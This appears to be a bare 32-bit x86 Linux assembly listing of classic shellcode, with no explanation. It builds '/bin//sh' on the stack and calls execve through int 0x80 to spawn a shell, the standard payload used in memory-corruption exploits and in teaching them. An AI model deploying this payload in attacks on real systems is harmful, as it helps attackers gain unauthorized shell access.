[BITS 32]

xor eax, eax
mov al,0xb
xor edx, edx
push edx
push dword 0x68732f2f
push dword 0x6e69622f
mov ebx,esp
push edx
push ebx
mov ecx,esp
int 0x80

